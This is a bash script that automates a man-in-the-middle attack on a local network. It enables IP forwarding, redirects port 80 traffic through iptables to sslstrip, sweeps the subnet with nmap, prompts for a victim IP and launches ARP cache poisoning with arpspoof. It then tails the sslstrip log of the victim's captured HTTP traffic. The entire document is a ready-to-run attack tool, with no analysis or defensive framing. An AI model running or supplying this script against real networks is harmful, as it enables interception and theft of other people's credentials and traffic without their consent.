# #!/bin/bash
# Bash script to launch man it the middle attack and sslstrip.
# version 0.9 by Y.S
version="20150914"
clear

echo -e "\033[36mRunning the script :\033[m"
sleep 1
echo -e "\033[31m [+] Cleaning iptables \033[m"
if [[ "$etter" = "1" ]];then
	killall ettercap
else
	killall arpspoof # inerface of conncet the mac adress to ip adress
fi
echo "0" > /proc/sys/net/ipv4/ip_forward #disable the IP Forwarding
iptables --flush # Delete all rules in  chain or all chains
iptables --table nat --flush # delete all table to manipulate
iptables --delete-chain #Delete matching rule from chain
iptables --table nat --delete-chain
killall sslstripid
killall sslstrip # sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping attacks.

echo "[-] Cleaned."

echo -e "$message"
echo -e "\033[31m [+] Activating IP forwarding... \033[m"
echo "1" > /proc/sys/net/ipv4/ip_forward
sleep 1
echo "[-] Activated."
echo -e "\033[31m [+] Configuring iptables... \033[m"
echo -en "\033[31m To \033[mwhat port should the traffic be redirected to? (default = 10000)"
echo
read -e outport
if [ "$outport" = "" ];then
	outport=10000
	echo -e "Port $outport selected as default.\n"
fi
echo -en "\033[31m From \033[mwhat port should the traffic be redirected to? (default = 80)"
echo
read -e inport
if [ "$inport" = "" ];then
	inport=80
	echo -e "Port $inport selected as default.\n"
fi
iptables -t nat -A PREROUTING -p tcp --destination-port $inport -j REDIRECT --to-port $outport
echo "[-] Traffic rerouted"
iptables -L -t nat


#/////////////////////////////////gnome-terminal

#Sslstrip

sslstrip $fav -p -l $outport & sslstripid=$!
sleep 4
# let to sslstrip time for work
echo
echo -e " [-] Sslstrip is running." # a bit redundant, but who cares?
echo


#Arpspoofing
echo
echo -e "\033[31m [+] Activating ARP cache poisoning... \033[m"
echo
ip route show | awk '(NR == 1) { print "Gateway :", $3,"    ", "Interface :", $5}' #Output IP route show user-friendly
iface=$(ip route show | awk '(NR == 1) { print $5}')
gateway=$(ip route show | awk '(NR == 1) { print $3}') #store gateway ip
echo
echo "Enter IP gateway adress or press enter to use $gateway."
read -e gateway
if [ "$gateway" = "" ];then
	gateway=$(ip route show | awk '(NR == 1) { print $3}') #restore gateway ip since pressing enter set our var to null
	echo -e "$gateway selected as default.\n"
fi
echo
echo "What interface would you like to use? It should match IP gateway as shown above. Press enter to use $iface."
read -e iface
if [ "$iface" = "" ];then
	iface=$(ip route show | awk '(NR == 1) { print $5}') #store default interface
	echo -e "$iface selected as default.\n"
fi
echo -e "\033[31m Scanning the all Computers (Host Live in same lan) please wait... \033[m"
nmap -sn $gateway/24
echo
echo
echo
echo -e "\033[36mGreat! now enter IP adress to attack :\033[m"
read -e IP_attack
gnome-terminal -e "arpspoof $fav -i $iface -t $IP_attack $gateway"
echo -e "\033[33m Targeting the whole network on $gateway on $iface with ARPspoof\033[m"
tail -f sslstrip.log